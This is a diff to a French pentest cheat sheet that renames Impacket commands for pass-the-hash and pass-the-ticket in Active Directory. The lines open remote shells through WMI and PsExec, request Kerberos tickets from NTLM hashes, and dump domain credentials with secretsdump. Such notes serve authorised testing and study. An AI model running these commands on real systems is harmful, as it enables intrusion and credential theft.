@@ -24,13 +24,13 @@ nxc ldap 'IP' -u Administrator -H ''NTLM_HASH''
 
 ```bash
 # shell via WMI
-impacket-wmiexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+wmiexec.py -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 
 # shell via PsExec (crée un service)
-impacket-psexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+psexec.py -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 
 # smbclient
-impacket-smbclient -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
+smbclient.py -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 ```
 
 **evil-winrm**
@@ -51,7 +51,7 @@ Obtenir le TGT
 
 ```bash
 # impacket
-impacket-getTGT corp.com/'USER' -hashes :'NTLM_HASH' -dc-ip 'IP_DC'
+getTGT.py corp.com/'USER' -hashes :'NTLM_HASH' -dc-ip 'IP_DC'
 
 # nxc
 nxc smb 'IP_DC' -u 'USER' -H 'NTLM_HASH' --generate-tgt /tmp/'USER'.ccache
@@ -63,10 +63,10 @@ Utiliser le TGT
 export KRB5CCNAME=/tmp/<USER>.ccache
 
 # impacket (-target-ip si le hostname ne résout pas sur Kali)
-impacket-psexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-wmiexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-smbclient -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
-impacket-secretsdump -k -no-pass corp.com/'USER'@'HOSTNAME_DC' -dc-ip 'IP_DC' -target-ip 'IP_DC'
+psexec.py -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+wmiexec.py -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+smbclient.py -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+secretsdump.py -k -no-pass corp.com/'USER'@'HOSTNAME_DC' -dc-ip 'IP_DC' -target-ip 'IP_DC'
 
 # nxc
 nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
